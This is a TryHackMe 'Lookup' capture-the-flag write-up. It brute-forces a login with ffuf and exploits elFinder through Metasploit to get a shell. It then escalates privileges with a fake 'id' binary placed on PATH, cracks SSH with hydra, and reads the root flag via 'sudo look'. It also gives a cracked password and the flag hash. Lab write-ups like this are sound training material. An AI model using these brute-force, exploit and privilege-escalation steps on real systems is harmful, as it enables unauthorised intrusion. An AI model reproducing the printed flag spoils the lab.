# TryHackMe Lookup Writeup

```
nmap -sCV 10.10.184.175
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 13:49 EST
Nmap scan report for lookup.thm (10.10.184.175)
Host is up (0.61s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:1c:32:19:40:69:9d:e1:49:a3:cc:64:50:82:33:bb (RSA)
|   256 a8:d1:be:74:90:f5:0d:d7:ed:5f:91:b3:e9:9b:1c:8d (ECDSA)
|_  256 cb:bf:af:22:58:27:53:a2:4a:25:6d:ff:d2:5a:05:b5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login Page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.54 seconds

```

----

> ### **``Edit /etc/host``**

<img width="1069" height="474" alt="image" src="https://github.com/user-attachments/assets/d8cde1e3-35cb-4d63-a26d-34c1a7aebebc" />

## fuzz on usernaem

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=REDACTED' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8
```

<img width="1138" height="544" alt="image" src="https://github.com/user-attachments/assets/b32c5eaf-a1ac-406e-9cc4-bbff6c9a2456" />

## fuzz on password

```
ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100
```

<img width="1128" height="546" alt="image" src="https://github.com/user-attachments/assets/b2f76e97-0f8a-47b6-a6fb-87e0c5a80468" />

```
jose : password123
```

<img width="1906" height="482" alt="image" src="https://github.com/user-attachments/assets/6d3770ca-e967-4e66-8fe5-6d0947e6dc09" />

## searchsploit `elfinder`

```
use 4
```

<img width="1203" height="543" alt="image" src="https://github.com/user-attachments/assets/2daa0ad7-93e0-457d-943e-6602456ca7ac" />

<img width="1144" height="256" alt="image" src="https://github.com/user-attachments/assets/12b6555a-4225-47a6-8da3-4558bed0c49e" />

## we will use metasploit

```
set RHOSTS <target_machine_ip>
set LHOST <your_machine_ip>
set VHOST files.lookup.thm
```

<img width="1098" height="520" alt="image" src="https://github.com/user-attachments/assets/f7e1f747-4f65-43e6-948e-c56c467d5799" />

<img width="987" height="111" alt="image" src="https://github.com/user-attachments/assets/e28c6f21-d552-42be-a749-80ae19366906" />

```
python3 -c 'import pty,os; pty.spawn("/bin/bash")'
```

<img width="1315" height="511" alt="image" src="https://github.com/user-attachments/assets/5fe0dabd-864a-4529-9bf6-7f94fbd4a880" />

----

## privesc

<img width="642" height="80" alt="image" src="https://github.com/user-attachments/assets/6e6f57c2-5778-4b36-988c-e1865836c925" />

It's a tool or script (`pwm`) that tries to locate a `.passwords` file in the `/home/www-data/` directory.

When the `id` command is executed without specifying its full path (e.g., `/bin/id`), the system relies on the `PATH` environment variable to locate and run it.

We can manipulate this behavior by creating a custom version of the `id` command. This way, the program executes our version instead, allowing us to produce output that reveals the "think" username.

```
cat > /tmp/id << 'EOF'
#!/bin/bash
echo "uid=1001(think) gid=1001(think) groups=1001(think)"
EOF

chmod +x /tmp/id

```

```
export PATH=/tmp:$PATH
```

```
/usr/sbin/pwm
```

### Let’s put all of that into a file and use hydra again to help crack it

```
hydra -l think -P passwords.txt ssh://10.65.154.155
```

<img width="1364" height="416" alt="image" src="https://github.com/user-attachments/assets/53b89fa6-8312-4f46-8bc8-44ad1ac4356c" />

```
josemario.AKA(think)
```

```
su think
```

<img width="938" height="191" alt="image" src="https://github.com/user-attachments/assets/d3e255e8-b4d5-4f94-9ad9-14e2940901c1" />

<img width="903" height="157" alt="image" src="https://github.com/user-attachments/assets/2ad7d30a-9aff-437a-b787-845a4840af6d" />

-----

## get rooot 

<img width="1101" height="250" alt="image" src="https://github.com/user-attachments/assets/ab65daa4-0e9a-4459-bb49-9ecf141500a3" />

## [gtfobins]

<img width="1148" height="249" alt="image" src="https://github.com/user-attachments/assets/0e458529-9ba6-4825-b622-99c942421981" />

<img width="1241" height="558" alt="image" src="https://github.com/user-attachments/assets/b18e572e-8eca-45de-b534-36b8ebb58290" />

```
sudo look '' /root/root.txt
```

<img width="854" height="105" alt="image" src="https://github.com/user-attachments/assets/2f394b4e-9887-4f93-b887-e7c45c967471" />

```
5a285a9f257e45c68bb6c9f9f57d18e8
```

